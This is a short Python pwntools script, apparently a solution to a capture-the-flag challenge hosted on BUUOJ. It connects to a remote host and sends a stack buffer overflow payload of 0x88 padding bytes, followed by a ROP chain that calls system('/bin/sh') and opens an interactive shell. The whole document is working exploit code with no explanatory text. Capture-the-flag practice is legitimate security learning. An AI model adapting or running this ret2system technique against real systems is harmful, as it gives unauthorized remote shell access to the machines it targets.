from pwn import *
#sh=process("./timu")
sh=remote("node4.buuoj.cn",25622)
system_plt=p64(0x0000000000400603)
bin_sh=p64(0x0000000000600a90)
pop_rdi_ret=p64(0x00000000004006b3)
sh.recv()
payload=0x88*b'a'+pop_rdi_ret+bin_sh+system_plt
sh.sendline(payload)
sh.interactive()
